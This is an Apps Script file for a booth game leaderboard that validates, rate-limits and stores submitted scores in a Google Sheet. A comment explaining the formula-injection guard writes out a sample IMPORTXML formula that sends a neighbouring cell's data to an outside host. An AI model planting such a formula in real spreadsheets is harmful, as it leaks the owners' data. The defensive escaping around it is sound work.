/* FACERINNA booth scoreboard — the Apps Script behind the ranking popup.
 *
 * WHAT IT IS FOR
 *   The five arcade games keep their scores in localStorage, so a booth iPad
 *   builds its own board and a visitor's phone builds a different one. Nobody
 *   can see anybody else. This is the shared board: every finished run posts
 *   here, and every popup reads the same rows back, whatever device played.
 *
 *   The sheet IS the admin panel. There is deliberately no admin API and no
 *   token: everything an organiser needs — see all runs, hide a joke name,
 *   delete a cheat, export the winners — is done by opening the sheet. An
 *   admin endpoint would have to carry a secret, and the only place to put a
 *   secret on a static page is in the page, where it is not a secret.
 *
 * ===================================================================
 *  NEVER PASTE THIS INTO AN APPS SCRIPT PROJECT THAT ALREADY HAS ONE
 * ===================================================================
 *
 *   A project has exactly one doPost and one doGet. Pasting this beside
 *   another web app REPLACES them, and re-deploying that deployment takes the
 *   old one off the air at the URL it has always answered on.
 *
 *   That is not hypothetical. This file went into the events REGISTRATION
 *   project on 9 Sept and broke registration the night before the PDM AGM:
 *   every submission came back "We could not send that", because this script
 *   was answering registration posts with {"ok":false,"error":"unknown game"}.
 *   Recovery was Deploy -> Manage deployments -> pencil -> Version: (the one
 *   before), Deploy — deployments pin a code snapshot, so rolling the version
 *   back restores the old behaviour at the same URL.
 *
 *   This gets its OWN project. Always.
 *
 * SET UP  (five minutes, and it must be you — the deployment is tied to your
 *          Google account and cannot be created from outside)
 *
 *   1. script.google.com -> New project.  NOT Extensions -> Apps Script from
 *      a sheet that already has a script on it. A standalone project can open
 *      any sheet by id, which is how one workbook holds the scores and the
 *      registrations side by side without the two scripts ever meeting.
 *   2. Delete the stub, paste this whole file.
 *   3. Put the workbook's id in Script Properties (Project Settings ->
 *      Script properties) as ADMIN_WORKBOOK_ID — the long string between /d/
 *      and /edit in its address. It is not committed in this file, which is
 *      public.
 *   4. Run -> setUp once. It builds the Scores tab with its headers and frozen
 *      row, beside whatever tabs are already there. Grant the permissions it
 *      asks for. You only ever do this once.
 *   5. Deploy -> New deployment -> type Web app.
 *        Execute as:        Me
 *        Who has access:    Anyone            <-- must be Anyone, not "Anyone
 *                                                 with Google account", or a
 *                                                 visitor's browser is asked
 *                                                 to sign in and the post dies
 *   6. Copy the /exec URL. That is what goes into fx-rank.js. Check it is a
 *      DIFFERENT string from any URL already in this repository before you
 *      hand it over — an identical one means step 1 went wrong.
 *
 *   Re-deploy after ANY edit to this file: Deploy -> Manage deployments ->
 *   the pencil -> Version: New version. Editing alone changes nothing that is
 *   live, which is the single most common way to spend an hour confused.
 *
 * THE ONE TRAP ON THE PAGE SIDE
 *   Post the body with NO Content-Type header. fetch then sends
 *   text/plain;charset=UTF-8, which is a "simple" request and skips the CORS
 *   preflight. Set application/json and the browser sends OPTIONS first, Apps
 *   Script does not answer OPTIONS, and every post fails with a CORS error
 *   that says nothing about the cause. The events registration endpoint on
 *   this same site already works exactly this way.
 *
 * WHAT THIS CAN AND CANNOT DO
 *   The endpoint is public and the page is readable, so anyone who can read the
 *   code can imitate its requests, and nothing here can prove a score was
 *   earned. What the server checks (see doPost) is that a post is the shape an
 *   honest game could send: a known game, a whole-number score inside a ceiling
 *   derived from that game's own rules (see GAMES), a clean name, a tournament
 *   time no human could beat, a run id not seen before, and a pace no person
 *   plays at. A post that fails any of it gets a bare {"ok":false} (no reason,
 *   so the reply cannot be used to probe the ceilings) and is written to the
 *   "Rejected" tab with the reason, never to the leaderboard.
 *
 *   It is a fence, not a lock. A forger who stays under a ceiling, and rotates
 *   device ids and names to slip the rate limits, still gets a score on the
 *   board: the ceilings only remove the absurd ones. Five games have no
 *   ceiling the code can prove, so theirs are generous on purpose (see GAMES). If a prize turns
 *   on the top score, an organiser should see the winning run happen, and
 *   should glance at the Rejected tab afterwards: a burst of "score-range"
 *   rows is someone trying.
 */

/* ------------------------------------------------------------------ config */

/* The workbook to write into: read from Script Properties, not committed
   here -- the id is the admin/vault/scores book and does not belong in a
   public repo. Set it once: Project Settings -> Script properties ->
   ADMIN_WORKBOOK_ID = the long string between /d/ and /edit in its address.
   A run without it fails loudly rather than open the wrong book. */
function sheetId_() {
  var id = PropertiesService.getScriptProperties().getProperty('ADMIN_WORKBOOK_ID');
  if (!id) throw new Error('ADMIN_WORKBOOK_ID is not set in Script Properties (Project Settings -> Script properties).');
  return id;
}
var SHEET_ID = sheetId_();   /* [REDACTED]; set ADMIN_WORKBOOK_ID in Script Properties */
var TAB      = 'Scores';

/* The games, by the id each game page declares in window.FX_RANK. A post
   naming anything else is refused: it is either a typo or somebody poking, and
   neither belongs in the board.

   WHAT `max` IS, AND HOW EACH ONE WAS WORKED OUT
   `max` is the most a run of that game can plausibly score, read off the game's
   own source (22 Nov 2026) rather than guessed. A post above it is refused. It
   is inclusive: a score equal to `max` is accepted. Four groups of game:

   BOUNDED -- the rules cap the score, so the ceiling is the arithmetic best
   case, rounded up to a clean figure for a little headroom:

     pack-match  5,000   Score is PER ROUND, not a running total (loadRound sets
                G.score = 0). A correct pick pays 400 x min(3, 1 + floor(streak/2)),
                a wrong one -150, and a cleared round adds 500 per heart left
                (max 3). The six rounds need 3,3,3,4,3,3 correct picks, so the best
                round is 4 picks: 400+800+800+1,200 = 3,200, plus 3 x 500 = 1,500
                = 4,700. (pack-match.html, resolve() and finish().)
     shelf-shot  7,000   Per level, score resets. +600 per correct pack (at most 3
                a level), +100 per shelf board or post destroyed (3 shelves x 3
                blocks = 9), -250 per wrong pack, +1,000 per drop left over on a
                win. A win needs at least one drop, so at most ammo-1 = 4 are left
                (the biggest level has 5). Worst level: 3x600 + 9x100 + 4x1,000
                = 6,700. (shelf-shot.html, damage() and finish().)
     deep-lab   18,000   Per level, score resets. +500 per target (at most 6),
                +100 per block (at most 16), +1,000 per drop left over (at most 4).
                Worst level, Early fine lines: 6x500 + 16x100 + 4x1,000 = 8,600.
                The ceiling is NOT 8,600: it is the game's own highest 3-star par,
                18,000, because the source cannot rule out a shard or chain path
                I did not trace, and the game itself calls 18,000 a 3-star run.
                (deep-lab.html, LEVEL_DEFS, damage() and finish().)
     facy-run   16,000   One fixed level (seeded, so identical every run), 180 s.
                Counted by building the level: 69 capsules x 100 = 6,900; 5 skin
                type blocks x 300 = 1,500; 6 stray ? blocks x 100 = 600; 5 concern
                gates x 500 = 2,500 (a wrong bubble pays nothing); 13 enemies
                (8 bumps + 5 rays) stomped x 150 = 1,950; flag 1,000 plus a time
                bonus of at most 1,500 = 2,500. Total 15,950.
     skin-iq         5   Five questions, one point each.
     tournament 60,000   Up to 5,000 a round (booth-admin.gs TOUR_MAX, the admin
                sets each round's own figure), up to twelve rounds. Also see
                TOUR_MIN_ROUND_SECS below.

   LADDER -- no time limit, the score climbs a level at a time, and the top is
   set by how far a person can get. The ceiling is the score at the highest level
   a human could plausibly reach, and the assumption is stated:

     match-lab  40,000   No timer: a run lasts until three hearts are lost, so a
                flawless run never ends. A bubble pays at most 30 (a right match
                at x3 streak; a dodged trap pays 3) and bubbles spawn no faster
                than one every 0.95 s once the ramp is done (t > 62 s), so the
                best possible rate is 30 / 0.95 = 31.6 points a second. Assuming
                nobody plays one flawless run for more than 20 minutes (1,200 s):
                31.6 x 1,200 = 37,900, rounded up. (match-lab.html, catchBubble().)
     magic-tiles 50,000  A tile pays (60 + 20 x combo) x level, combo capped at 9,
                so at most 240 x level. Level L ends when the score reaches
                targetFor(L) = 900 + 700 (L-1), so while on level L the score is
                below that target plus the tile that crossed it. Tile speed is
                150 + 34 (L-1) px/s on a 640 px board: at level 40 that is
                1,476 px/s, a tile crossing the board in 0.43 s with a new one
                every 0.42 s, which no hand follows. Level 40: 900 + 700 x 39 =
                28,200, plus two tiles landing in the same frame, 2 x 240 x 40 =
                19,200, = 47,400, rounded up. (magic-tiles-4k.html, tapLane().)
     pack-slicer 50,000  Same shape. A slice pays (70 + 25 x combo) x level (combo
                capped at 9, at most 295 x level); level L ends at targetFor(L) =
                800 + 650 (L-1). Level 40: 800 + 650 x 39 = 26,150, plus two
                slices in one frame, 2 x 295 x 40 = 23,600, = 49,750.
                (pack-slicer-4k.html.)

   NOT TIGHTENED -- the code gives no ceiling below the one these games already
   had, so those stay as they were. They are the weakest point of this check,
   and that is stated here rather than hidden behind a number that looks derived:

     lab-run   100,000   Score is 0.6 per metre plus 10 per drop. Speed ramps from
                14 to 30 m/s and a held turbo multiplies it by 1.55 (46.5 m/s),
                so distance pays at most 27.9 a second; drop rows come at most
                every 8.4 m with up to 5 drops (50), 5.95 a metre. The best
                possible rate, perfect dodging with turbo held and every drop
                taken, is about 305 a second: 100,000 is 5.5 minutes of that.
     pack-drop 100,000   A line clear pays [0,100,300,500,800][rows] x level, plus
                200 x level per star, plus bombs (60 + 25n) x level; level is
                1 + floor(lines / 5) and gravity stops rising at level 22. No
                timer, quadratic in level, no human limit I can prove.
     pack-crush 200,000  Level L needs 6,000 + 2,200 (L-1) points in 25 to 18
                moves, plus 300 for every move left. The targets alone to level 10
                are 159,000, and the move bonuses add up to 7,500 a level.
                200,000 is a flawless run of about nine levels.
     pack-recall 200,000  A level is 8 pairs: (120 + 40 x streak) x level with
                streak capped at 6 is 2,280 x level, plus the one gold pair on a packs
                round (500 x level), plus 150 x level for each try left (at most 9).
                Cumulative to level 10, flawless, is about 208,000.
     match-factory 200,000  One 30-move run (level never advances). Each cascade
                step pays (60 + 30 x combo) x (1 + 0.35 x (cleared - 3)), combo
                capped at 9, on an 8 x 8 board. A move can chain, so the best case
                is in the hundreds of thousands; a normal run is a few thousand.

   To tighten these five, let the booth run for an hour, read the Scores tab
   (or run preview()) and set each `max` to well above the best honest score: that
   one number is the cheapest anti-nonsense control here and costs one re-deploy.
   If a game's scoring changes, re-derive its line above. */
function isGame_(id) {
  return typeof id === 'string' && Object.prototype.hasOwnProperty.call(GAMES, id);
}
var GAMES = {
  'match-lab':  { name: 'Match Lab',  max: 40000 },
  'pack-match': { name: 'Pack Match', max: 5000 },
  'shelf-shot': { name: 'Shelf Shot', max: 7000 },
  'deep-lab':   { name: 'Deep Lab',   max: 18000 },
  'lab-run':    { name: 'Lab Run',    max: 100000 },
  'facy-run':   { name: 'Facy Run',   max: 16000 },
  'pack-drop':  { name: 'Pack Drop',  max: 100000 },
  'pack-crush': { name: 'Pack Crush', max: 200000 },
  'pack-recall': { name: 'Pack Recall', max: 200000 },
  'magic-tiles': { name: 'Magic Tiles', max: 50000 },
  'pack-slicer': { name: 'Pack Slicer', max: 50000 },
  'match-factory': { name: 'Match Factory', max: 200000 },
  /* the tournament books its total here: up to 5,000 points a round (the admin sets each),
     twelve rounds. It is ranked on its own rule, see better_: most points, then the
     fastest, then the highest level. */
  'tournament': { name: 'Tournament', max: 60000 },
  'skin-iq':    { name: 'Skin IQ',    max: 5 }
};

var NAME_MAX   = 18;   /* matches the name field's maxlength on the game pages */
var KEEP       = 500;  /* rows read back per game; the sheet keeps everything  */
var RATE_N     = 12;   /* posts allowed per name+game ...                      */
var RATE_SECS  = 60;   /* ... per this many seconds                            */
/* A booth iPad is one device and many visitors, and a phone that was offline
   flushes its queue (up to 50 runs) the moment it reconnects, so the per-device
   brake is a flood brake, not a pace: no honest device posts 60 runs in a minute. */
var DEVICE_N   = 60;   /* posts allowed per device, all games together ...     */
var DEVICE_SECS = 60;  /* ... per this many seconds                            */
var BODY_MAX   = 2000; /* bytes; an honest post is about 150                   */
/* The tournament is the one game that sends how long the run took (`secs`, the
   sum of its rounds). A round cannot be played in under a few seconds, and a
   5,000-point round cannot be made faster than any other, so a total of S points
   took at least ceil(S / 5000) rounds. Only a time that WAS sent is held to it: a
   missing time ranks as the slowest (see order_), so leaving it out gains nothing,
   and an old page that sends none is not turned away. */
var TOUR_ROUND_MAX = 5000, TOUR_MIN_ROUND_SECS = 3;
/* The Rejected tab: a bounded log, so a flood of bad posts cannot fill the workbook. */
var REJ_TAB    = 'Rejected';
var REJ_KEEP   = 1000; /* rows kept; the oldest go first                        */
var REJ_LOG_N  = 30;   /* rows written per minute, whatever arrives             */

var HEADERS = ['when', 'ts', 'game', 'name', 'score', 'device', 'hidden', 'agent', 'seconds', 'level'];
var REJ_HEADERS = ['when', 'reason', 'game', 'name', 'score', 'device', 'detail'];

/* ------------------------------------------------------------------- setup */

function setUp() {
  var sh = tab_();
  if (sh.getLastRow() === 0) {
    sh.appendRow(HEADERS);
    sh.setFrozenRows(1);
    sh.getRange(1, 1, 1, HEADERS.length).setFontWeight('bold');
    sh.setColumnWidth(1, 165);
    sh.hideColumns(2);                       /* epoch ms: for tie-breaks, not reading */
    sh.hideColumns(8);                       /* user agent: for spotting a bot        */
  }
  rejTab_();                                 /* the log of refused posts, beside the board */
  return 'Ready. Tab "' + TAB + '" has ' + (sh.getLastRow() - 1) + ' score row(s); tab "' + REJ_TAB + '" is ready.';
}

function tab_() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  if (!ss) throw new Error('No spreadsheet. Set ADMIN_WORKBOOK_ID in Script Properties.');
  return ss.getSheetByName(TAB) || ss.insertSheet(TAB);
}

/* The log of refused posts. Made on first use as well as by setUp, because a
   deployment that was set up before this tab existed never runs setUp again. */
function rejTab_() {
  var ss = SpreadsheetApp.openById(SHEET_ID);
  if (!ss) throw new Error('No spreadsheet. Set ADMIN_WORKBOOK_ID in Script Properties.');
  var sh = ss.getSheetByName(REJ_TAB);
  if (!sh) {
    sh = ss.insertSheet(REJ_TAB);
    sh.appendRow(REJ_HEADERS);
    sh.setFrozenRows(1);
    sh.getRange(1, 1, 1, REJ_HEADERS.length).setFontWeight('bold');
  }
  return sh;
}

/* --------------------------------------------------------------- responses */

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

/* ---------------------------------------------------------------- reading */

/*  ?game=match-lab&top=5   one game
 *  ?all=1&top=5            all five in one request — what the booth's combined
 *                          board wants, so it makes one call instead of five
 */
function doGet(e) {
  try {
    var p   = (e && e.parameter) || {};
    var top = Math.min(parseInt(p.top, 10) || 5, 50);

    var b = boards_();

    if (p.all) {
      var all = {};
      for (var id in GAMES) all[id] = (b[id] ? b[id].rows : []).slice(0, top);
      return json_({ ok: true, games: all, at: Date.now() });
    }

    var one = String(p.game || '');
    if (!isGame_(one)) return json_({ ok: false, error: 'unknown game' });
    var g = b[one] || { rows: [], n: 0 };
    return json_({ ok: true, game: one, rows: g.rows.slice(0, top), players: g.n, at: Date.now() });
  } catch (err) {
    return json_({ ok: false, error: String(err && err.message || err) });
  }
}

/* Every visible row, bucketed by game. One read of the whole sheet, because
   getValues() once is far cheaper than five filtered reads.

   Columns 2..7 only (ts, game, name, score, device, hidden). The user-agent
   column is the widest thing in the sheet and nothing here reads it. */
function readAll_() {
  var sh = tab_();
  var last = sh.getLastRow();
  var out = {};
  if (last < 2) return out;

  var lc = sh.getLastColumn ? sh.getLastColumn() : 8;
  var wide = Math.max(6, Math.min(lc - 1, 9));   /* ts .. level; older sheets stop at hidden or agent */
  var vals = sh.getRange(2, 2, last - 1, wide).getValues();   /* ts, game, name, score, device, hidden, [agent, seconds, level] */
  for (var i = 0; i < vals.length; i++) {
    var r = vals[i];
    if (r[5] === true || String(r[5]).toUpperCase() === 'TRUE') continue;  /* hidden */
    var id = String(r[1]);
    if (!isGame_(id)) continue;
    (out[id] = out[id] || []).push({
      n: String(r[2]),
      s: Number(r[3]),
      t: Number(r[0]) || 0,
      m: Math.max(0, Math.floor(Number(r[7]) || 0)),   /* seconds the run took; 0 when not kept */
      l: Math.max(0, Math.floor(Number(r[8]) || 0))    /* level; 0 when not kept */
    });
  }
  return out;
}

/* ---------------------------------------------------------------- caching */

/* The board, worked out once and kept for a few seconds.
 *
 * Every read used to walk the whole sheet, and so did every write, because a
 * post reported back the poster's new rank. That is O(rows) per request on a
 * table that only grows: fine at ten runs, and the slowest thing at the booth
 * by mid-afternoon, which is exactly when people are queuing to play.
 *
 * The cached shape is the FINISHED board -- five short lists -- not the raw
 * rows, so it stays a few KB however long the day gets.
 *
 * A post updates this in place rather than dropping it, so the next reader is
 * served from memory and still sees the run that just happened. The TTL is the
 * backstop for the one thing that does not come through here: an organiser
 * ticking `hidden` in the sheet by hand, which shows up within CACHE_SECS.
 */
var CACHE_SECS = 20;
var CACHE_KEY  = 'boards.v1';

function boards_() {
  var c = CacheService.getScriptCache();
  var hit = c.get(CACHE_KEY);
  if (hit) { try { return JSON.parse(hit); } catch (e) {} }
  var raw = readAll_(), out = {};
  for (var id in GAMES) {
    var b = bests_(raw[id] || []);
    out[id] = { rows: b.slice(0, 50), n: b.length };
  }
  c.put(CACHE_KEY, JSON.stringify(out), CACHE_SECS);
  return out;
}

function putBoards_(b) {
  try { CacheService.getScriptCache().put(CACHE_KEY, JSON.stringify(b), CACHE_SECS); }
  catch (e) {}
}
function dropBoards_() {
  try { CacheService.getScriptCache().remove(CACHE_KEY); } catch (e) {}
}

/* Fold one finished run into an already-computed board, the same way bests_
   would have: one row per person, their best, ties to the earlier run. Saves
   the whole-sheet read on the path that people are actually waiting on. */
function merge_(board, name, score, ts, secs, level) {
  var rows = (board.rows || []).slice();
  var key = name.toLowerCase(), found = false;
  for (var i = 0; i < rows.length; i++) {
    if (String(rows[i].n).toLowerCase() === key) {
      found = true;
      var mine = { n: name, s: score, t: ts, m: secs || 0, l: level || 0 };
      if (better_(mine, rows[i])) rows[i] = mine;
      break;
    }
  }
  if (!found) rows.push({ n: name, s: score, t: ts, m: secs || 0, l: level || 0 });
  rows.sort(order_);
  return { rows: rows.slice(0, 50), n: found ? board.n : (board.n || 0) + 1 };
}

/* One row per person, their best run — the same rule the page already applies,
   so the popup and the sheet can never tell different stories. Ties go to the
   earlier run, which is how the page has always broken them. */
/* The order of a board. Every game: the higher score, and on a tie the earlier run.
   The tournament has two more rules between those, so a tie is never a coin toss:
   the FASTER run (less total time), then the HIGHER level. A run with no time kept
   (an old row) counts as the slowest, and no level as the lowest. */
function order_(a, b) {
  if (b.s !== a.s) return b.s - a.s;
  var am = a.m > 0 ? a.m : 1e9, bm = b.m > 0 ? b.m : 1e9;
  if (am !== bm) return am - bm;
  if ((b.l || 0) !== (a.l || 0)) return (b.l || 0) - (a.l || 0);
  return a.t - b.t;
}
function better_(a, b) { return order_(a, b) < 0; }

function bests_(rows) {
  var seen = {}, out = [];
  rows.filter(function (r) { return r && isFinite(r.s) && r.n; })
      .sort(order_)
      .forEach(function (r) {
        var k = r.n.toLowerCase();
        if (seen[k]) return;
        seen[k] = 1;
        out.push(r);
      });
  return out.slice(0, KEEP);
}

/* ---------------------------------------------------------------- writing */

/* Body: {"game":"match-lab","name":"Ahmad","score":1234,"device":"a1b2c3"}
 * Back: {"ok":true,"rank":3,"best":1234,"players":27,"rows":[...]}
 *
 * The reply carries the board so a finished run is one round trip, not two:
 * at a booth the popup opens the moment the game ends and there is no second
 * gap to hide a fetch in.
 */
/* A spreadsheet cell that starts with = + - or @ is a FORMULA the moment the
   workbook is opened, not text. These rows carry what a stranger typed into a
   public form, so a "name" of =IMPORTXML("https://theirs/"&B2,"//a") would run
   in our workbook, with our access, and hand them the row next to it. A
   leading apostrophe makes Sheets keep the value as text; it does not show in
   the cell and it does not change what anybody reads. */
function cell_(v) {
  var s = String(v == null ? '' : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/* A name is shown on the board and written into a spreadsheet, and it is the one
   field a stranger fully controls. Control characters become a space, invisible
   formatting characters (zero-width, bidi overrides, BOM) are dropped, runs of
   whitespace collapse, and any leading = + - @ is stripped (with the cell_ guard
   below as a second line), so a name cannot turn into a formula or hide behind an
   invisible prefix. Not a string at all (a number, an object) is no name. */
var NAME_CONTROL = /[\u0000-\u001f\u007f-\u009f]/g;
var NAME_INVISIBLE = /[\u00ad\u061c\u180e\u200b-\u200f\u2028-\u202e\u2060-\u206f\ufeff\ufff9-\ufffb]/g;
function cleanName_(v) {
  if (typeof v !== 'string') return '';
  var s = v.replace(NAME_CONTROL, ' ').replace(NAME_INVISIBLE, '').replace(/\s+/g, ' ').trim();
  s = s.replace(/^[\s=+\-@]+/, '');
  s = s.slice(0, NAME_MAX);
  var last = s.charCodeAt(s.length - 1);
  if (last >= 0xD800 && last <= 0xDBFF) s = s.slice(0, -1);   /* never leave half an emoji */
  return s.trim();
}

/* The fewest seconds a tournament total can honestly have taken. */
function minTourSecs_(score) {
  return Math.max(1, Math.ceil(score / TOUR_ROUND_MAX)) * TOUR_MIN_ROUND_SECS;
}

/* Every refusal comes through here: the log gets the reason, the player gets a
   bare {"ok":false}. The page treats any ok:false as "refused, do not queue it
   again", and a reason in the reply would only tell a forger which ceiling or
   limit to feel for next. */
function reject_(reason, body, detail) {
  logReject_(reason, body, detail);
  return json_({ ok: false });
}

function clip_(v, n) {
  var t;
  if (v === undefined || v === null) t = '';
  else if (typeof v === 'object') { try { t = JSON.stringify(v); } catch (x) { t = '[object]'; } }
  else t = String(v);
  return t.replace(NAME_CONTROL, ' ').slice(0, n);
}

/* Best effort and never in the way: a log that fails must not fail the reply,
   and a flood of bad posts is capped at REJ_LOG_N rows a minute so it cannot
   fill the workbook. The stored text is whatever a stranger sent, so every cell
   goes through cell_. No lock: appendRow is one atomic call. */
function logReject_(reason, body, detail) {
  try {
    var cache = CacheService.getScriptCache();
    var n = parseInt(cache.get('rl'), 10) || 0;
    if (n >= REJ_LOG_N) return;
    cache.put('rl', String(n + 1), 60);
    var b = (body && typeof body === 'object') ? body : {};
    var sh = rejTab_();
    sh.appendRow([new Date(), reason, cell_(clip_(b.game, 30)), cell_(clip_(b.name, 40)),
                  cell_(clip_(b.score, 24)), cell_(clip_(b.device, 40)), cell_(clip_(detail, 80))]);
    /* every 50th row, trim to the newest REJ_KEEP */
    var total = (parseInt(cache.get('rj'), 10) || 0) + 1;
    cache.put('rj', String(total), 21600);
    if (total % 50 === 0) {
      var last = sh.getLastRow();
      if (last > REJ_KEEP + 1) sh.deleteRows(2, last - 1 - REJ_KEEP);
    }
  } catch (x) { try { Logger.log('reject log failed: ' + x); } catch (y) {} }
}

function doPost(e) {
  var body = null;
  try {
    /* ---- 1. is it the shape of a score at all? (no state, no lock) ---- */
    var raw = String((e && e.postData && e.postData.contents) || '{}');
    if (raw.length > BODY_MAX) return reject_('too-large', null, raw.length + ' chars');
    try { body = JSON.parse(raw); }
    catch (bad) { return reject_('bad-json', null, raw); }
    if (!body || typeof body !== 'object' || Array.isArray(body)) return reject_('bad-body', null, raw);

    var id = (typeof body.game === 'string') ? body.game : '';
    if (!isGame_(id)) return reject_('unknown-game', body);

    var name = cleanName_(body.name);
    if (!name) return reject_('bad-name', body);

    /* A real number, not the text of one: Number('12') used to be let through. */
    var score = body.score;
    if (typeof score !== 'number' || !isFinite(score) || Math.floor(score) !== score)
      return reject_('score-not-whole-number', body);
    if (score < 0 || score > GAMES[id].max)
      return reject_('score-out-of-range', body, 'max ' + GAMES[id].max);
    score = score + 0;                                   /* -0 is 0 */

    /* Only the tournament keeps how long the run took and how far it got: they decide a tie. */
    var secs = 0, level = 0;
    if (id === 'tournament') {
      secs = Math.floor(Number(body.secs)); level = Math.floor(Number(body.level));
      secs = isFinite(secs) ? Math.max(0, Math.min(secs, 86400)) : 0;
      level = isFinite(level) ? Math.max(0, Math.min(level, 999)) : 0;
      /* a time that was sent must be one a person could have taken */
      if (secs > 0 && secs < minTourSecs_(score))
        return reject_('tournament-too-fast', body, 'secs ' + secs + ' < ' + minTourSecs_(score));
    }

    /* ---- 2. have we seen this run, and is this device or name flooding? ----
       Cache only, so a refusal here costs no sheet read, no lock wait and no write.
       A repeat is answered ok (see dupReply_) because the page sends the same
       run again when a reply is lost, and that is an honest retry, not a forgery:
       it is not written twice, and it does not count against the rate limits. */
    var dk = dupKey_(body, id, name, score);
    if (seenRun_(dk)) { logReject_('duplicate-run', body); return dupReply_(id, name); }

    if (!underRate_(id, name)) return reject_('rate-limit-name', body);
    if (!underDeviceRate_(body.device)) return reject_('rate-limit-device', body);

    /* ---- 3. under the lock: the last look, the write, the cached board ----
       Two people finishing at the same instant both read the same last row and
       one write lands on top of the other. The lock is the whole reason the
       board can be trusted at a busy booth. It stays held through the cached
       board's read-merge-write below too: releasing it right after the sheet
       append let two concurrent posts both read the same cached board, merge
       their own run into it separately, and then each overwrite the cache with
       a copy missing the other's update -- and merge_ itself can double-count
       a player who had fallen out of the cached top 50 when that happens. */
    var now = new Date();
    var lock = LockService.getScriptLock();
    lock.waitLock(20000);
    var all, repeat = false;
    try {
      if (seenRun_(dk)) { repeat = true; all = boards_(); logReject_('duplicate-run', body); }   /* the other copy got the lock first */
      else {
      tab_().appendRow([
        now,
        now.getTime(),
        id,
        cell_(name),
        score,
        cell_(String(body.device || '').slice(0, 40)),
        false,
        String((e && e.postData && e.postData.type) || '') +
          ' ' + String(body.ua || '').slice(0, 120),
        secs || '',
        level || ''
      ]);
      /* a sheet made before these two columns has no titles over them: put them there once */
      try { var hh = tab_(); if (hh.getRange(1, 9).getValue() === '') hh.getRange(1, 9, 1, 2).setValues([['seconds', 'level']]); } catch (e2) {}
      /* written before the lock is let go, so the next run reads it */
      try { SpreadsheetApp.flush(); } catch (e) {}

      /* Folded into the cached board rather than re-derived from the sheet. The
         poster is waiting on this reply with a result screen already up, and
         walking every row written today to tell them they came third is the one
         piece of work here that gets slower the better the day goes. */
      all = boards_();
      all[id] = merge_(all[id] || { rows: [], n: 0 }, name, score, now.getTime(), secs, level);
      putBoards_(all);
      markRun_(dk);
      }
    } finally {
      lock.releaseLock();
    }

    var rows = all[id].rows, rank = null, best = null;
    for (var i = 0; i < rows.length; i++) {
      if (String(rows[i].n).toLowerCase() === name.toLowerCase()) {
        rank = i + 1; best = rows[i].s; break;
      }
    }
    return json_({ ok: true, rank: rank, best: best, players: all[id].n, rows: rows.slice(0, 5) });
  } catch (err) {
    /* the cause goes to the log, not to whoever sent the post */
    return reject_('error', body, String(err && err.message || err));
  }
}

function dupReply_(game, name) {
  var b = (boards_()[game]) || { rows: [], n: 0 }, rank = null, best = null;
  for (var i = 0; i < b.rows.length; i++) {
    if (String(b.rows[i].n).toLowerCase() === name.toLowerCase()) { rank = i + 1; best = b.rows[i].s; break; }
  }
  return json_({ ok: true, rank: rank, best: best, players: b.n, rows: b.rows.slice(0, 5), repeat: true });
}
/* The same run arriving twice is one run: a reply lost on the way back so the page sent it again, a
   double tap, a retry from the queue. Each run carries an id (rid) made by the page and kept here for
   ten minutes. A page from before that sends none, so the same device, game, name and score inside
   fifteen seconds stands for the same run (a real run takes far longer than that). Cache only, so it
   costs no sheet read, and it makes a second post cheap: no lock wait, no write. */
var DUP_SECS = 600, DUP_FALLBACK_SECS = 15;
function dupKey_(body, game, name, score) {
  var rid = String((body && body.rid) || '').replace(/[^A-Za-z0-9_-]/g, '').slice(0, 40);
  if (rid.length >= 8) return { key: 'd:' + rid, secs: DUP_SECS };
  return { key: 'd:' + game + ':' + String((body && body.device) || '').slice(0, 40) + ':' + name.toLowerCase() + ':' + score,
           secs: DUP_FALLBACK_SECS };
}
function seenRun_(dk) {
  try { return !!CacheService.getScriptCache().get(dk.key); } catch (e) { return false; }
}
function markRun_(dk) {
  try { CacheService.getScriptCache().put(dk.key, '1', dk.secs); } catch (e) {}
}

/* A booth run takes the better part of a minute, so a dozen posts from one
   name inside sixty seconds is not somebody playing. Cache-based, so it costs
   no sheet reads and forgets by itself. */
function underRate_(game, name) {
  var cache = CacheService.getScriptCache();
  var key = 'r:' + game + ':' + name.toLowerCase();
  var n = parseInt(cache.get(key), 10) || 0;
  if (n >= RATE_N) return false;
  cache.put(key, String(n + 1), RATE_SECS);
  return true;
}

/* One device cannot post faster than a flood brake allows, whatever games or
   names it uses. A post with no device at all shares one bucket: every honest
   page sends a device id, so that bucket is only ever used by something that is
   not one, and it cannot lock an honest device out (they have their own). The
   id is whatever the sender chose, so a forger who changes it every request
   dodges this; the per-name limit and the ceilings are what still apply then. */
function underDeviceRate_(device) {
  var d = String(device == null ? '' : device).replace(/[^A-Za-z0-9_-]/g, '').slice(0, 40) || 'none';
  var cache = CacheService.getScriptCache();
  var key = 'rd:' + d;
  var n = parseInt(cache.get(key), 10) || 0;
  if (n >= DEVICE_N) return false;
  cache.put(key, String(n + 1), DEVICE_SECS);
  return true;
}

/* ------------------------------------------------------------ maintenance */

/* Run from the editor when the board should start clean — the morning of a
   show, say. It hides rather than deletes: the runs stay in the sheet, out of
   the board, and a mistake is one un-tick away. */
function hideAllSoFar() {
  var sh = tab_();
  var last = sh.getLastRow();
  if (last < 2) return 'Nothing to hide.';
  sh.getRange(2, 7, last - 1, 1).setValue(true);
  /* Without this the board keeps serving the old names for up to CACHE_SECS,
     which is the whole point of clearing it that nobody would believe. */
  dropBoards_();
  return 'Hid ' + (last - 1) + ' row(s). The board is now empty; the runs are still here.';
}

/* What the board looks like right now, printed in the editor — a way to check
   the script without opening the booth page. */
function preview() {
  var rows = readAll_();
  var out = [];
  for (var id in GAMES) {
    var b = bests_(rows[id] || []).slice(0, 5);
    out.push(GAMES[id].name + ': ' + (b.length
      ? b.map(function (r, i) { return (i + 1) + '. ' + r.n + ' ' + r.s; }).join('  |  ')
      : '(no scores yet)'));
  }
  Logger.log(out.join('\n'));
  return out.join('\n');
}
